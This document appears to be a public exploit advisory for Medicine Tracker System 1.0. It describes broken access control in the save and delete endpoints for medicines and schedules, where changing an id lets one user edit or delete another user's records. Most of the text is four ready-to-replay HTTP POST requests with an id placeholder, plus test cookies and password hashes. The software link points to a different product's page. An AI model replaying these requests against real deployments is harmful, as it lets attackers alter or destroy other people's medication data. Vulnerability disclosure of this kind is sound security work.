# Exploit Title: Medicine Tracker System 1.0 - Broken Access Control Exploit

It leads to Update, Delete other schedules, medicines via id of other account

### Date: 
> April 15, 2023


### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Medicine Tracker System](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### Broken Authentication:
> Broken Access Control is a type of security vulnerability that occurs when a web application fails to properly restrict users' access to certain resources and functionality. Access control is the process of ensuring that users are authorized to access only the resources and functionality that they are supposed to. Broken Access Control can occur due to poor implementation of access controls in the application, failure to validate input, or insufficient testing and review.

# Tested On: Windows 10, XAMPP

### Affected Page:
> classes/Master.php?f=save_schedule
\
> classes/Master.php?f=delete_schedule
\
> classes/Master.php?f=delete_medicine
\
> classes/Master.php?f=save_medicine 

> On these page, application isn't verifying the authorization mechanism. Due to that, all the parameters are vulnerable to broken access control and any account will change other content via ID

### Description:
> Broken access control allows low privilege attacker to change, delete schedule,medicine content of all application users

### Proof of Concept:
> Following steps are involved:
1. Visit the vulnerable page change/delete schedule,medicine 
2. Send request to repeater of burpsuite and change ID


4. Request:
```
POST /php-mts/classes/Master.php?f=save_medicine HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 192
Origin: http://localhost
Connection: close
Referer: http://localhost/php-mts/app/?page=medicines/manage_medicine&id=2
Cookie: eid=1; remember_me_name=bMGFrQaFzDhuoLmztZCT; remember_me_pwd=YMSm3Q2wFDHaHLQ5eZPKc42oU7CaK8IlA%40q1; remember_me_lang=en; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680329430; Hm_lvt_5320b69f4f1caa9328dfada73c8e6a75=1680329567; table-page-size=50; PowerBB_username=xss; PowerBB_password=8879f85d0170cba2a4328bbb5a457c6a; menu_contracted=false; PHPSESSID=e67hpqdmcqi2k65669nv8cagm3
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=CHANGE_HERE&name=Medicine+102&description=Donec+elementum+bibendum+iaculis.+Suspendisse+ultricies+pellentesque+mi+eget+mattis.+Sed+velit+dolor%2C+pulvinar+vitae+scelerisque+varius%2C+congue+id+sapien

```

```
POST /php-mts/classes/Master.php?f=delete_medicine HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 4
Origin: http://localhost
Connection: close
Referer: http://localhost/php-mts/app/?page=medicines
Cookie: eid=1; remember_me_name=bMGFrQaFzDhuoLmztZCT; remember_me_pwd=YMSm3Q2wFDHaHLQ5eZPKc42oU7CaK8IlA%40q1; remember_me_lang=en; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680329430; Hm_lvt_5320b69f4f1caa9328dfada73c8e6a75=1680329567; table-page-size=50; PowerBB_username=xss; PowerBB_password=8879f85d0170cba2a4328bbb5a457c6a; menu_contracted=false; PHPSESSID=e67hpqdmcqi2k65669nv8cagm3
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=CHANGE_HERE

```

```
POST /php-mts/classes/Master.php?f=delete_schedule HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 4
Origin: http://localhost
Connection: close
Referer: http://localhost/php-mts/app/?page=schedules/view_details&id=7
Cookie: eid=1; remember_me_name=bMGFrQaFzDhuoLmztZCT; remember_me_pwd=YMSm3Q2wFDHaHLQ5eZPKc42oU7CaK8IlA%40q1; remember_me_lang=en; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680329430; Hm_lvt_5320b69f4f1caa9328dfada73c8e6a75=1680329567; table-page-size=50; PowerBB_username=xss; PowerBB_password=8879f85d0170cba2a4328bbb5a457c6a; menu_contracted=false; PHPSESSID=e67hpqdmcqi2k65669nv8cagm3
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=CHANGE_HERE
```


```
POST /php-mts/classes/Master.php?f=save_schedule HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 133
Origin: http://localhost
Connection: close
Referer: http://localhost/php-mts/app/?page=schedules/manage_schedule&id=8
Cookie: eid=2; download_started=0; plupload_ui_view=thumbs; PowerBB_username=tuanth; PowerBB_password=32298fc135b3fecf012a4c27efbba188; jstree_select=1; PHPSESSID=tkq3kpibi0iflud0k7oa1v8hfi
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=8&user_id=4&medicine_id=7&day%5B%5D=Monday&date_start=0003-11-19&until=&lifetime_schedule=on&remarks=SSSSSSSSSSS&time=22%3A02%3A00

```

